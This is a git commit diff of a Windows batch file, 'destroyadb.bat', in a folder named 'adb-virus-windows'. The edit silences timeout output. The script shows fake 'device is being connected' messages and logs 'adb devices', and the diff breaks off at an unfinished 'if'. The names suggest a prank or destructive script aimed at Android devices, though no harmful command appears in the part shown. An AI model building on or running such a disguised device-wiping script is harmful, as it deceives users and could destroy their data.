3ed87aa241ef4f7b335564b520d5b6fb91ed6bae
PassiHD2004 <59457929+PassiHD2004@users.noreply.github.com>
2022-07-06 19:16:29 +0200

    Update destroyadb.bat

--- adb-virus-windows/destroyadb.bat
+++ adb-virus-windows/destroyadb.bat
@@ -1,15 +1,15 @@
 @echo off
-timeout /T 1 /nobreak
+timeout /T 1 /nobreak >nul
 echo Hey
-timeout /T 2 /nobreak
+timeout /T 2 /nobreak >nul
 echo Your device is being connected
-timeout /T 1 /nobreak
+timeout /T 1 /nobreak >nul
 echo .
-timeout /T 1 /nobreak
+timeout /T 1 /nobreak >nul
 echo ..
-timeout /T 1 /nobreak
+timeout /T 1 /nobreak >nul
 echo ...
-timeout /T 2 /nobreak
+timeout /T 2 /nobreak >nul
 adb devices >> output.txt
-timeout /T 2 /nobreak
+timeout /T 2 /nobreak >nul
 if 
